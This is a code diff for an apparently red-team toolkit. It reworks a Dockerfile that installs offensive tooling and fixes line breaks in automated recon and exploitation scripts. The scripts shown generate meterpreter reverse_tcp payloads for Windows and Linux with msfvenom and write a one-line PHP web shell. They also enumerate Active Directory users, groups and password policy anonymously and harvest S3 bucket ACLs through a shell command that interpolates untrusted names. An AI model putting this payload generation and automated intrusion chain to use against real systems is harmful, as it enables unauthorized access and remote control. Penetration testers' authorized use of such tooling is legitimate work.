@@ -9,25 +9,32 @@ LABEL maintainer="red-team@example.com" \
 RUN set -euo pipefail && \
     apt-get update && \
     DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
-    git jq dos2unix python3-pip python3-venv\
     metasploit-framework exploitdb bloodhound \
     crackmapexec powersploit impacket-scripts \
     nuclei eyewitness wafw00f cloudmapper \
-    golang nodejs npm\
+    golang nodejs npm python3.11-venv \
+git\
+jq\
+dos2unix \
+    playwright chromium firefox-esr \
+  libnss3 libnspr4 libatk1.0-0 libatk-bridge2.0-0 libcups2 \
+  libdrm2 libxkbcommon0 libatspi2.0-0 libxcomposite1 libxdamage1 \
+  libxfixes3 libxrandr2 libgbm1 libpango-1.0-0 libcairo2 \
+  libasound2 libxshmfence1 libx11-xcb1 libxcursor1 \
+  fonts-liberation libappindicator3-1 libxss1 \
+  ffmpeg\
     awscli gcloud-sdk azure-cli \
     amass subfinder naabu httpx && \
-    apt-get clean && rm -rf /var/lib/apt/lists/* \
-
-RUN  pip3 install --break-system-packages --no-cache-dir \
+    pip3 install --break-system-packages --no-cache-dir \
     mitm6 dnspython xsshunter \
     commix sqlmap bs4 requests \
     playwright-stealth pwntools && \
-    python3 -m playwright install --with-deps chromium firefox
+    apt-get clean && rm -rf /var/lib/apt/lists/*
 
 # 2. Install specialized security tools
-RUN git clone --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists && \
-    git clone --depth 1 https://github.com/projectdiscovery/nuclei-templates.git /root/nuclei-templates && \
-    git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git /opt/payloads-all-the-things && \
+RUN git clone --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists && \
+    git clone --depth 1 https://github.com/projectdiscovery/nuclei-templates /root/nuclei-templates && \
+    git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings /opt/payloads-all-the-things && \
     go install -v github.com/projectdiscovery/katana/cmd/katana@latest && \
     go install -v github.com/projectdiscovery/notify/cmd/notify@latest && \
     go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && \
@@ -96,8 +103,7 @@ for host in root.findall('host'):
 cve_lookup() {
     local service="$1"
     local version="$2"
-    searchsploit -j --cve "$service $version" | jq -r '.RESULTS_EXPLOIT[] | .Title + "|" + .Path' |
-sort -u
+    searchsploit -j --cve "$service $version" | jq -r '.RESULTS_EXPLOIT[] | .Title + "|" + .Path' | sort -u
 }
 
 cloud_recon() {
@@ -127,12 +133,10 @@ generate_payload() {
 
     case "$exploit_type" in
         windows)
-            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f exe -o
-"$output_file" >/dev/null
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f exe -o "$output_file" >/dev/null
             ;;
         linux)
-            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f elf -o
-"$output_file" >/dev/null
+            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f elf -o "$output_file" >/dev/null
             ;;
         web)
             echo "<?php system(\$_REQUEST['cmd']); ?>" > "$output_file"
@@ -185,12 +189,10 @@ if grep -q "88/tcp" "$OUTPUT_DIR/naabu_scan.txt"; then
     log MEDIUM "Kerberos port detected, starting AD reconnaissance"
     crackmapexec smb "$TARGET_DOMAIN" --users > "$OUTPUT_DIR/ad_users.txt"
     crackmapexec smb "$TARGET_DOMAIN" --groups > "$OUTPUT_DIR/ad_groups.txt"
-    crackmapexec smb "$TARGET_DOMAIN" --pass-pol >
-"$OUTPUT_DIR/ad_password_policy.txt"
+    crackmapexec smb "$TARGET_DOMAIN" --pass-pol > "$OUTPUT_DIR/ad_password_policy.txt"
 
     # Bloodhound collection
-    bloodhound-python -d "$TARGET_DOMAIN" -u "anonymous" -p "" -ns
-"DOMAIN_CONTROLLER_IP" -c All > "$OUTPUT_DIR/bloodhound_collect.log"
+    bloodhound-python -d "$TARGET_DOMAIN" -u "anonymous" -p "" -ns "DOMAIN_CONTROLLER_IP" -c All > "$OUTPUT_DIR/bloodhound_collect.log"
 fi
 
 log HIGH "Reconnaissance completed for $TARGET_DOMAIN"
@@ -266,8 +268,7 @@ class ExploitEngine:
             with open(s3_output, 'r') as f:
                 for bucket in f.readlines():
                     bucket_name = bucket.split()[-1]
-                    subprocess.run(f"aws s3api get-bucket-acl --bucket {bucket_name} >>
-{self.output_dir}/s3_acls.txt", shell=True)
+                    subprocess.run(f"aws s3api get-bucket-acl --bucket {bucket_name} >> {self.output_dir}/s3_acls.txt", shell=True)
 
 if __name__ == "__main__":
     import argparse
